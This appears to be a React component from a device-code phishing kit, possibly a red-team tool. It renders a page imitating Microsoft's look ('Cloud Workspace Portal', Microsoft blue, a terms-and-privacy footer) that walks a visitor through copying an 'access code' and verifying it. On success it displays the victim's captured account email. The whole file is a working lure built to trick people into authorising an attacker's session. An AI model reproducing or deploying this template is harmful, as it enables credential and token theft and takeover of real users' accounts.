import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function MicrosoftOfficeTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('microsoft-office');

  const logo = (
    <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
      <span style={{ fontSize: 18, fontWeight: 600, color: '#2c2c2c' }}>Cloud Workspace</span>
    </div>
  );

  return (
    <div className="tpl-page" style={{ background: '#fafafa' }}>
      <div className="tpl-container" style={{ maxWidth: 480 }}>
        <div style={{ marginBottom: 24 }}>{logo}</div>
        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Cloud Workspace Portal</h1>
              <p className="tpl-text">Access your apps, files, and services. Verify your identity to continue.</p>
              <div className="tpl-info-box" style={{ background: '#f3f9ff', borderColor: '#c7e0f4', color: '#0078d4' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                <span>Access your documents, projects & collaboration tools</span>
              </div>
              <button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleStart}>Get Started</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Connecting to workspace...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Code</h1>
              <p className="tpl-text">Use this code to access your workspace account.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">ACCESS CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the access code</div><div className="tpl-step">2. Click the button below and enter the code</div></div>
              <button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleVerify}>Verify with Code</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Verification Complete</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">Welcome to your workspace.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Verify another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Terms of use</span><span>Privacy & cookies</span></div>
      </div>
    </div>
  );
}
